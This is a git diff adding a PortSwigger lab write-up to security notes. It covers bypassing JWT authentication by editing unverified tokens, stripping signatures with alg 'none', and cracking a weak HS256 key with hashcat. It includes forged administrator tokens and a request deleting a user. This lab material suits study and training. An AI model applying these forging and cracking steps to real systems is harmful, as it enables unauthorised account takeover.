@@ -2507,7 +2507,87 @@ python2.7 jwt_tool.py <JWT_TOKEN> /tmp/wordlist
 ```
 Reference: [PayloadsAllTheThings - JWT](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token)
 
+### JWT authentication bypass via unverified signature
+
+We can change this JWT in the JSON Web Token extension panel:
+
+![image](https://github.com/user-attachments/assets/da5969c7-811a-489b-b029-ae4ca3d9e371)
+
+Getting the JWT:
+
+```
+eyJraWQiOiI0MTZkMDg2Yy00MDdhLTRiYzQtODhhMy00MzAyZTUzMTk1ZTgiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImFkbWluaXN0cmF0b3IiLCJleHAiOjE2ODM3ODg2MzR9.qmaz_uqHRR06JTx5vtenCveTPOtzi3mG0X1WMJhnKV3AmzlI3Pjceo3Lldu2oLHcP9SEblyJxJJ5hIO3VVAKzWsWGjNw4aN1vZCBhxzcY-MgxuspBc3XpS1_oMeenFcfEn0I4Jlob_YMrZVqQbdp8i1w_SpYLkMOkDaLlgPZk3TwZa1U005YBhHjQrItMBYWRtQDnP4rYnHkTsgwmWRu8RMCirq9-SS9gczbr2YEENZuPrxWphbYwCSMtivcysFOKXEzCvO7juIKqAfE_WmB6qx41I8Wny-qlkbeU3-9VXyIM8iC6opD6wlUiI9S328bjXN_ZFWsuRdaDVyvE4gRXw
+```
+Then I changed the “Location” header to “/admin”:
+
+![image](https://github.com/user-attachments/assets/b0156e2c-8e35-4ad3-89d4-50aeb6d05608)
+
+Getting access to the admin panel:
+
+![image](https://github.com/user-attachments/assets/89668e77-b8d3-48c5-9ec5-e6b206acf166)
+
+2. **JWT authentication bypass via flawed signature verification**
+
+This lab uses a JWT-based mechanism for handling sessions. The server is insecurely configured to accept unsigned JWTs.
+To solve the lab, modify your session token to gain access to the admin panel at /admin, then delete the user carlos.
+
+![image](https://github.com/user-attachments/assets/8a135d4b-a427-48d1-822a-48086d7826db)
+
+![image](https://github.com/user-attachments/assets/4b3faa7e-e5f3-48c9-ad29-b07ddb31377b)
+
+Then delete everything after the second “.” character (that is the signature):
+
+```
+eyJraWQiOiIzNjlmMmFjZC1hZTUwLTQ4YzctYTM2Ny04NTczYzllNTc0ZmQiLCJhbGciOiJub25lIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImFkbWluaXN0cmF0b3IiLCJleHAiOjE2ODM3ODk4MzB9.
+```
+![image](https://github.com/user-attachments/assets/fa64c5e8-2c1e-4925-a16c-a45b7b8923bf)
+
+Access the admin panel and delete the user:
+
+![image](https://github.com/user-attachments/assets/5b85ee97-332b-41cb-bc5d-3696e16a5a91)
 ---
+3. **JWT authentication bypass via weak signing key**
+
+This lab uses a JWT-based mechanism for handling sessions. It uses an extremely weak secret key to both sign and verify tokens. This can be easily brute-forced using a wordlist of common secrets.
+To solve the lab, first brute-force the website's secret key. Once you've obtained this, use it to sign a modified session token that gives you access to the admin panel at /admin, then delete the user carlos.
+We also recommend using hashcat to brute-force the secret key. For details on how to do this, see Brute forcing secret keys using hashcat.
+
+After logging in we get a signed JWT:
+
+```
+eyJraWQiOiJiNzU4ZDZjOC01NTIzLTQ0YmQtOTgzYS1iMDlhZDA0YjBmOTciLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY4Mzc5MDMwNX0.ltkivPFm-8ecty4-ipdJS2BtN5aBoTxDQD7tYE2kujo
+```
+![image](https://github.com/user-attachments/assets/a716bb03-fb18-454b-aa1e-b0aeb5919a4f)
+
+Then we try to crack it:
+
+```
+hashcat -a 0 -m 16500 "eyJraWQiOiJiNzU4ZDZjOC01NTIzLTQ0YmQtOTgzYS1iMDlhZDA0YjBmOTciLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY4Mzc5MDMwNX0.ltkivPFm-8ecty4-ipdJS2BtN5aBoTxDQD7tYE2kujo" jwt.secrets.list
+```
+
+![image](https://github.com/user-attachments/assets/0bd23181-89f0-49a2-a2b3-b2669756578e)
+
+The cracked value is “secret1”:
+
+![image](https://github.com/user-attachments/assets/854f8a72-32f0-42cc-9743-b7b3909ba967)
+
+I do not understand the JWT extension so I used jwt.io:
+
+![image](https://github.com/user-attachments/assets/39764e8f-a299-4df3-9097-c0698c0b26fc)
+
+Getting the following JWT:
+```
+eyJraWQiOiJiNzU4ZDZjOC01NTIzLTQ0YmQtOTgzYS1iMDlhZDA0YjBmOTciLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImFkbWluaXN0cmF0b3IiLCJleHAiOjE2ODM3OTAzMDV9.WCZa62PPzrA56xkxKPQ1VjgF0P4WpzEQH1DUe9q6ih0
+```
+It is possible to access as the administrator user with that JWT and delete the user:
+
+```
+GET /admin/delete?username=carlos HTTP/2
+...
+Cookie: session=eyJraWQiOiJiNzU4ZDZjOC01NTIzLTQ0YmQtOTgzYS1iMDlhZDA0YjBmOTciLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImFkbWluaXN0cmF0b3IiLCJleHAiOjE2ODM3OTAzMDV9.WCZa62PPzrA56xkxKPQ1VjgF0P4WpzEQH1DUe9q6ih0
+...
+```
+![image](https://github.com/user-attachments/assets/f82cddc8-322a-4c85-bf1f-a5b59a270458)
 
 ## LDAP Injection
 LDAP Injection exploits applications that construct LDAP queries based on user input.
